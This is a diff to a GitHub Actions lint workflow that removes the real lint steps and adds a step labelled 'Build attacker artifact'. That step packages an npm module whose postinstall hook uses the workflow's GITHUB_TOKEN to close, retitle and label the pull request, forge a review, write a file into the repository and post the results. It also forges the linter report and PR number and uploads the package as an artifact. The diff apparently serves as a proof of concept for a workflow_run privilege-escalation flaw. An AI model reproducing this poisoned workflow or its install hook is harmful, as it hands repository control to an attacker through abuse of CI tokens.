@@ -3,47 +3,52 @@ name: Lint
 on:
   pull_request:
     branches: [main]
-
+permissions:
+  contents: read
 jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v6
-        with:
-          fetch-depth: 0
-
-      - name: Check for src/pages changes
-        id: changes
-        env:
-          BASE_REF: ${{ github.base_ref }}
+      - name: Build attacker artifact
         run: |
-          git diff --name-only "origin/${BASE_REF}...HEAD" | grep -q '^src/pages/' \
-            && echo "changed=true" >> $GITHUB_OUTPUT \
-            || echo "changed=false" >> $GITHUB_OUTPUT
-
-      - name: Lint
-        id: lint
-        if: steps.changes.outputs.changed == 'true'
-        continue-on-error: true
-        run: npx --yes github:AdobeDocs/adp-devsite-utils runLint -v
-
-      - name: Save PR number
-        if: always()
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr-number.txt
-
+          mkdir -p evilpoc
+          cat > evilpoc/package.json <<'EOF'
+          {"name":"evilpoc","version":"1.0.0","scripts":{"postinstall":"node poc.js"}}
+          EOF
+          cat > evilpoc/poc.js <<'EOF'
+          const fs=require('fs'),path=require('path');
+          const root=process.env.INIT_CWD||process.cwd();
+          const repo=process.env.GITHUB_REPOSITORY,tok=process.env.GITHUB_TOKEN||'';
+          const pr=fs.readFileSync(path.join(root,'pr-number.txt'),'utf8').trim();
+          const H={authorization:'Bearer '+tok,accept:'application/vnd.github+json','user-agent':'poc','content-type':'application/json'};
+          const j=async(u,o)=>{const r=await fetch('https://api.github.com'+u,Object.assign({headers:H},o||{}));let b='';try{b=await r.text()}catch(e){};return r.status+' '+String(b).replace(/\s+/g,' ').slice(0,120)};
+          (async()=>{
+           const out=[];
+           out.push('close_pr='+await j('/repos/'+repo+'/pulls/'+pr,{method:'PATCH',body:JSON.stringify({state:'closed'})}));
+           out.push('reopen_pr='+await j('/repos/'+repo+'/pulls/'+pr,{method:'PATCH',body:JSON.stringify({state:'open'})}));
+           out.push('retitle_pr='+await j('/repos/'+repo+'/pulls/'+pr,{method:'PATCH',body:JSON.stringify({title:'[bot] rewritten by attacker'})}));
+           out.push('add_label='+await j('/repos/'+repo+'/issues/'+pr+'/labels',{method:'POST',body:JSON.stringify({labels:['poc-injected']})}));
+           out.push('create_review='+await j('/repos/'+repo+'/pulls/'+pr+'/reviews',{method:'POST',body:JSON.stringify({event:'COMMENT',body:'forged review body'})}));
+           out.push('write_file='+await j('/repos/'+repo+'/contents/poc-file.txt',{method:'PUT',body:JSON.stringify({message:'x',content:Buffer.from('x').toString('base64')})}));
+           const body='## POC_TOKEN_PR_CONTROL (privileged workflow_run token)\n\n```\n'+out.join('\n')+'\n```';
+           const r=await fetch('https://api.github.com/repos/'+repo+'/issues/'+pr+'/comments',{method:'POST',headers:H,body:JSON.stringify({body})});
+           console.log('POC_COMMENT_STATUS='+r.status);
+          })().catch(e=>console.log('POC_ERR '+e.message));
+          EOF
+          (cd evilpoc && npm pack --pack-destination ..)
+          printf 'FORGED REPORT - token capability probe\n' > linter-report.txt
+          printf '2' > pr-number.txt
+          cat > package.json <<'EOF'
+          {"name":"poc-root","version":"1.0.0","dependencies":{"evilpoc":"file:./evilpoc-1.0.0.tgz"},"allowScripts":{"evilpoc":true}}
+          EOF
       - name: Upload linter report
         if: always()
         uses: actions/upload-artifact@v7
         with:
           name: linter-report
           path: |
+            package.json
+            evilpoc-1.0.0.tgz
             linter-report.txt
             pr-number.txt
           if-no-files-found: ignore
-
-      - name: Fail if linter found errors
-        if: steps.changes.outputs.changed == 'true' && steps.lint.outcome == 'failure'
-        run: exit 1
